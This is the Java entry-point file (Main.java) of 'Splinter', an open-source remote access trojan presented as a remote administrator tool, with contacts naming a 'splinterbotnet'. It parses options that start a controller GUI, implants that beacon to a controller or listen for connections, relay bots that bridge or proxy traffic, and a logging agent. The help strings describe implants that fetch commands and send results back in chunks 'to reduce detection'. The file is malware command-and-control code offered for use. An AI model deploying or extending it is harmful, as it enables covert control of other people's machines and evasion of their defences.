/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




import Controller.Drivers.Drivers;
import Controller.GUI.Splinter_GUI;
import Controller.GUI.Splinter_LOGGIE;
import Implant.Driver;
import Implant.Implant_ServerSocket;
import Implant.Splinter_IMPLANT;
import RelayBot.RelayBot_ServerSocket;
import java.io.File;
import java.io.PrintStream;
import javax.swing.UIManager;

public class Main
{
  public static final String STARTUP_LAUNCH_GUI_DELIMETER = "-g";
  public static final String STARTUP_DISPLAY_HELP_DELIMETER = "-h";
  public static final String STARTUP_IMPLANT_PERSISTENT_CONNECTION = "-i";
  public static final String STARTUP_IMPLANT_BEACON_ENABLED = "-b";
  public static final String STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION = "-l";
  public static final String STARTUP_ESTABLISH_RELAY_BOT = "-r";
  public static final String STARTUP_RELAY_BRIDGE_MODE = "-bridge";
  public static final String STARTUP_RELAY_PROXY_MODE = "-proxy";
  public static final String STARTUP_LOGGER_AGENT = "-loggie";
  public static final String STARTUP_IMPLANT_BEACON_ENABLED_HELP = "-b\tTrue Beaconing. \n\t\tInspired by @armitagehacker, implant checks in with controller \n\t\tfor new commands to execute or to continue sleeping if no \n\t\tcommands are available.  Results are parsed and transmitted \n\t\tto controller in chunks to reduce detection.\n\t\tFormat: [Controller Addr] [Port] [Beacon Interval] [s/m/h] \n\t\te.g. splinter.exe -b 192.168.0.5 80 1 h";
  public static final String STARTUP_LAUNCH_GUI_HELP = "-g\tDisplay the User Interface (GUI)";
  public static final String STARTUP_DISPLAY_HELP_HELP = "-h\tDisplays help options";
  public static final String STARTUP_LAUNCH_IMPLANT_BEACON_HELP = "-i\tImplant mode with optional beaconing. \n\t\tMaintains persistent connection to controller \n\t\tArguments: [Controller Addr] [Port] <beacon interval in secs>\n\t\tBeacon interval: 0-disabled, T5-immediately, [# secs]-otherwise\n\t\te.g. splinter.exe -i 192.168.0.5 80 T5";
  public static final String STARTUP_IMPLANT_LISTEN_TO_ONLY_ONE_CONNECTION_HELP = "-l\tArguments: [ServerSocket Port] \n\t\tListening mode. Accepts ONLY 1 connection from controller\n\t\te.g. splinter.exe -l 80";
  public static final String STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS_HELP = "-L\tListening mode. Accepts Multiple connections from controller(s) \n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -L 80";
  public static final String STARTUP_LOGGER_AGENT_HELP = "-loggie\tLogging Agent.\n\t\tConnect logging agent to Controller to save a log of connection\n\t\ttraffic. NOTE: Logging agents are only intended for use \n\t\twith Controller User Intrefaces \n\t\te.g. splinter.exe -loggie [Controller Addr] [Port]";
  public static final String STARTUP_RELAY_BRIDE_HELP = "-bridge\tRelay Bridge Mode. Multiple agents including Controllers ALL \n\t\tconnect to this relay bot. Relay bot will bridge agent \n\t\tand Controller sockets to each other\n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -bridge 80 ";
  public static final String STARTUP_RELAY_PROXY_HELP = "-proxy\tRelay Proxy Mode. Multiple agents connect to this relay bot. \n\t\tRelay bot will proxy connection and establish outbound socket \n\t\tconnection to controller \n\t\tArguments: [ServerSocketPort] [Controller Addr] [Port] \n\t\te.g. splinter.exe -proxy 80 192.168.0.5 80";
  public static Splinter_GUI RAT;

  public static void main(String[] args)
  {
    try
    {
      UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel"); } catch (Exception localException) {
    }
    Drivers.printConsoleWelcomeSplash();

    displayHelp();

    if ((args == null) || (args.length < 1))
    {
      RAT = new Splinter_GUI();
      RAT.setVisible(true);
    }
    else if ((args[0] == null) || (args[0].equalsIgnoreCase("-g")))
    {
      Drivers.sop("Launching GUI");
      RAT = new Splinter_GUI();
      RAT.setVisible(true);
    }
    else if (args[0].equalsIgnoreCase("-h"))
    {
      displayHelp();
    }
    else if (args[0].equalsIgnoreCase("-i"))
    {
      initiateImplant_Persistent_Connection(args);
    }
    else if (args[0].equalsIgnoreCase("-b"))
    {
      initiateImplant_Beacon(args);
    }
    else if (!args[0].equals("-l"))
    {
      if (args[0].equals("-L"))
      {
        initiateImplant_listen_MULTIPLE_connections(args);
      }
      else if (args[0].equals("-bridge"))
      {
        initiateRelayBot_Bridge(args);
      }
      else if (args[0].equals("-proxy"))
      {
        initiateRelayBot_Proxy(args);
      }
      else if (args[0].equals("-loggie"))
      {
        initiateLoggingAgent(args);
      }
      else
      {
        displayHelp();
      }
    }
  }

  public static boolean initiateLoggingAgent(String[] arg)
  {
    try
    {
      int PORT = Integer.parseInt(arg[2]);

      String controllerAddress = arg[1];

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      File loogingDirectoryTopFolder = Driver.querySelectFile(false, "Please Select the Directory to save log files", 1, false, false);

      if ((loogingDirectoryTopFolder == null) || (!loogingDirectoryTopFolder.exists()) || (!loogingDirectoryTopFolder.isDirectory()))
      {
        throw new Exception("Invalid log directory specified");
      }

      Splinter_LOGGIE loggie = new Splinter_LOGGIE(controllerAddress, PORT, loogingDirectoryTopFolder.getCanonicalPath());

      return true;
    }
    catch (Exception localException)
    {
      Driver.sop("\nInvalid input specified for logging agent!!!");
      Driver.sop("\t-loggie\tLogging Agent.\n\t\tConnect logging agent to Controller to save a log of connection\n\t\ttraffic. NOTE: Logging agents are only intended for use \n\t\twith Controller User Intrefaces \n\t\te.g. splinter.exe -loggie [Controller Addr] [Port]");
      System.exit(0);
    }

    return false;
  }

  public static boolean initiateImplant_listen_single_connection(String[] arg)
  {
    try
    {
      int PORT = Integer.parseInt(arg[1]);

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      Implant_ServerSocket serverSocket = new Implant_ServerSocket(PORT, false);
      serverSocket.start();

      return true;
    }
    catch (Exception e)
    {
      sop("Invalid input specified to initiate ServerSocket. Unable to continue...");
      sop("-l\tArguments: [ServerSocket Port] \n\t\tListening mode. Accepts ONLY 1 connection from controller\n\t\te.g. splinter.exe -l 80");
      System.exit(0);
    }

    return false;
  }

  public static boolean initiateImplant_Persistent_Connection(String[] arg)
  {
    try
    {
      String address = arg[1];
      int PORT = Integer.parseInt(arg[2]);
      int beaconInterval_secs = 0;

      if (arg.length != 3)
      {
        if (arg[3].trim().equalsIgnoreCase("T5"))
        {
          beaconInterval_secs = 1;
        }
        else
        {
          beaconInterval_secs = Integer.parseInt(arg[3]);
        }

      }

      boolean beacon = false;
      boolean beaconImmediately = false;

      if ((address == null) || (address.trim().equals("")))
      {
        System.out.print("address to Controller not set!!!");
        throw new Exception("address to Controller not set!!!");
      }

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      if (beaconInterval_secs < 0)
      {
        System.out.print("Beacon Interval out of range!!!   ");
        throw new Exception("beacon inteval out of range");
      }

      if (beaconInterval_secs == 0)
      {
        beacon = false;
        beaconImmediately = false;
      }
      else if (beaconInterval_secs == 1)
      {
        beacon = true;
        beaconImmediately = true;
      }
      else
      {
        beaconInterval_secs *= 1000;

        beacon = true;
        beaconImmediately = false;
      }

      Splinter_IMPLANT implant = new Splinter_IMPLANT(address, PORT, beacon, beaconImmediately, beaconInterval_secs);
      implant.start();

      return true;
    }
    catch (Exception e)
    {
      sop("\nInvalid input specified to initiate implant. Unable to continue...");

      sop("\t-i\tImplant mode with optional beaconing. \n\t\tMaintains persistent connection to controller \n\t\tArguments: [Controller Addr] [Port] <beacon interval in secs>\n\t\tBeacon interval: 0-disabled, T5-immediately, [# secs]-otherwise\n\t\te.g. splinter.exe -i 192.168.0.5 80 T5");
      System.exit(0);
    }

    return false;
  }

  public static boolean initiateRelayBot_Bridge(String[] arg)
  {
    try
    {
      int PORT = Integer.parseInt(arg[1]);

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      RelayBot_ServerSocket bridgeBot = new RelayBot_ServerSocket(true, false, PORT, "", 0);
      bridgeBot.start();

      return true;
    }
    catch (Exception e)
    {
      Drivers.sop("Relay bot Bridging Mode Invalid Input!!!");
    }

    return false;
  }

  public static boolean initiateImplant_Beacon(String[] arg)
  {
    try
    {
      String address = arg[1];

      int PORT = Integer.parseInt(arg[2]);

      int beaconInterval_secs = 0;

      if (arg[3].trim().equalsIgnoreCase("T5"))
      {
        beaconInterval_secs = 1;
      }
      else
      {
        beaconInterval_secs = Integer.parseInt(arg[3]);
      }

      boolean beacon = true;
      boolean beaconImmediately = false;

      if ((address == null) || (address.trim().equals("")))
      {
        System.out.print("address to Controller not set!!!");
        throw new Exception("address to Controller not set!!!");
      }

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      if (beaconInterval_secs < 0)
      {
        System.out.print("Beacon Interval out of range!!!   ");
        throw new Exception("beacon inteval out of range");
      }

      if (beaconInterval_secs < 2)
      {
        beaconInterval_secs = 1;
      }
      else if (beaconInterval_secs == 1)
      {
        beacon = true;
        beaconImmediately = true;
      }

      String timingOption = arg[4].trim();
      int factor = 1000;

      if ((timingOption.equalsIgnoreCase("s")) || (timingOption.equalsIgnoreCase("sec")) || (timingOption.equalsIgnoreCase("secs")) || (timingOption.equalsIgnoreCase("second")) || (timingOption.equalsIgnoreCase("seconds")))
      {
        factor = 1000;
      }
      else if ((timingOption.equalsIgnoreCase("m")) || (timingOption.equalsIgnoreCase("min")) || (timingOption.equalsIgnoreCase("mins")) || (timingOption.equalsIgnoreCase("minute")) || (timingOption.equalsIgnoreCase("minutes")))
      {
        factor = 60000;
      }
      else if ((timingOption.equalsIgnoreCase("h")) || (timingOption.equalsIgnoreCase("hr")) || (timingOption.equalsIgnoreCase("hrs")) || (timingOption.equalsIgnoreCase("hour")) || (timingOption.equalsIgnoreCase("hours")))
      {
        factor = 3600000;
      }
      else if ((timingOption.equalsIgnoreCase("d")) || (timingOption.equalsIgnoreCase("dy")) || (timingOption.equalsIgnoreCase("day")) || (timingOption.equalsIgnoreCase("days")))
      {
        factor = 86400000;
      }
      else if ((timingOption.equalsIgnoreCase("w")) || (timingOption.equalsIgnoreCase("wk")) || (timingOption.equalsIgnoreCase("wks")) || (timingOption.equalsIgnoreCase("week")) || (timingOption.equalsIgnoreCase("weeks")))
      {
        factor = 604800000;
      }
      else if ((timingOption.equalsIgnoreCase("mo")) || (timingOption.equalsIgnoreCase("mos")) || (timingOption.equalsIgnoreCase("month")) || (timingOption.equalsIgnoreCase("months")))
      {
        factor = -1875767296;
      }
      else if ((timingOption.equalsIgnoreCase("y")) || (timingOption.equalsIgnoreCase("yr")) || (timingOption.equalsIgnoreCase("year")) || (timingOption.equalsIgnoreCase("years")))
      {
        factor = -1034371072;
      }

      beaconInterval_secs *= factor;

      Driver.sop("Starting beacon implant for : " + beaconInterval_secs / 1000 + "second intervals");

      Splinter_IMPLANT implant = new Splinter_IMPLANT(address, PORT, beaconInterval_secs);
      implant.i_am_beacon_implant = true;
      implant.start();

      return true;
    }
    catch (Exception e)
    {
      sop("\nInvalid input specified to initiate implant. Unable to continue...");

      sop("\t-b\tTrue Beaconing. \n\t\tInspired by @armitagehacker, implant checks in with controller \n\t\tfor new commands to execute or to continue sleeping if no \n\t\tcommands are available.  Results are parsed and transmitted \n\t\tto controller in chunks to reduce detection.\n\t\tFormat: [Controller Addr] [Port] [Beacon Interval] [s/m/h] \n\t\te.g. splinter.exe -b 192.168.0.5 80 1 h");
      System.exit(0);
    }

    return false;
  }

  public static boolean initiateImplant_listen_MULTIPLE_connections(String[] arg)
  {
    try
    {
      int PORT = Integer.parseInt(arg[1]);

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      Implant_ServerSocket serverSocket = new Implant_ServerSocket(PORT, true);
      serverSocket.start();

      return true;
    }
    catch (Exception e)
    {
      sop("Invalid input specified to initiate ServerSocket. Unable to continue...");
      sop("-L\tListening mode. Accepts Multiple connections from controller(s) \n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -L 80");
      System.exit(0);
    }

    return false;
  }

  public static boolean initiateRelayBot_Proxy(String[] arg)
  {
    try
    {
      int PORT = Integer.parseInt(arg[1]);

      String controllerAddress = arg[2];

      if ((PORT < 1) || (PORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      int controllerPORT = Integer.parseInt(arg[3]);

      if ((controllerPORT < 1) || (controllerPORT > 65534))
      {
        System.out.print("Port out of range!!!!  ");
        throw new Exception("port out of range");
      }

      RelayBot_ServerSocket proxyBot = new RelayBot_ServerSocket(false, true, PORT, controllerAddress, controllerPORT);
      proxyBot.start();

      return true;
    }
    catch (Exception e)
    {
      Drivers.sop("Relay bot Proxy Mode Invalid Input!!!");
    }

    return false;
  }

  public static void displayHelp()
  {
    sop("OPTIONS:\n");
    sop("\n\t-g\tDisplay the User Interface (GUI)");
    sop("\n\t-h\tDisplays help options");

    sop("\n\t-i\tImplant mode with optional beaconing. \n\t\tMaintains persistent connection to controller \n\t\tArguments: [Controller Addr] [Port] <beacon interval in secs>\n\t\tBeacon interval: 0-disabled, T5-immediately, [# secs]-otherwise\n\t\te.g. splinter.exe -i 192.168.0.5 80 T5");
    sop("\n\t-b\tTrue Beaconing. \n\t\tInspired by @armitagehacker, implant checks in with controller \n\t\tfor new commands to execute or to continue sleeping if no \n\t\tcommands are available.  Results are parsed and transmitted \n\t\tto controller in chunks to reduce detection.\n\t\tFormat: [Controller Addr] [Port] [Beacon Interval] [s/m/h] \n\t\te.g. splinter.exe -b 192.168.0.5 80 1 h");

    sop("\n\t-L\tListening mode. Accepts Multiple connections from controller(s) \n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -L 80");

    sop("\n\t-bridge\tRelay Bridge Mode. Multiple agents including Controllers ALL \n\t\tconnect to this relay bot. Relay bot will bridge agent \n\t\tand Controller sockets to each other\n\t\tArguments: [ServerSocketPort] \n\t\te.g. splinter.exe -bridge 80 ");
    sop("\n\t-proxy\tRelay Proxy Mode. Multiple agents connect to this relay bot. \n\t\tRelay bot will proxy connection and establish outbound socket \n\t\tconnection to controller \n\t\tArguments: [ServerSocketPort] [Controller Addr] [Port] \n\t\te.g. splinter.exe -proxy 80 192.168.0.5 80");
    sop("\n\t-loggie\tLogging Agent.\n\t\tConnect logging agent to Controller to save a log of connection\n\t\ttraffic. NOTE: Logging agents are only intended for use \n\t\twith Controller User Intrefaces \n\t\te.g. splinter.exe -loggie [Controller Addr] [Port]");
    sop("");
  }

  public static void sop(String out)
  {
    System.out.println(out);
  }
}